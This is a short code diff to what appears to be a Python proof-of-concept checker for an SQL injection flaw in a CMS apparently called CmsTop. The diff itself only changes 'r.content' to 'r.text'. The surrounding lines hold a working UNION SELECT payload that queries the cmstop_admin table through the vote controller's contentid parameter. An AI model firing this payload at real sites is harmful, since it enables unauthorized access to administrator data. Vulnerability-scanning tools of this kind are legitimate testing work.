@@ -51,7 +51,7 @@ class Poc(ABPoc):
             payload = "/?app=vote&controller=vote&action=total&contentid=1 and 1=2 union select md5(c) from cmstop_admin where departmentid=2 limit 0,1;#"
             url = self.target + payload
             r = requests.get(url)
-            if '4a8a08f09d37b73795649038408b5f33' in r.content:
+            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
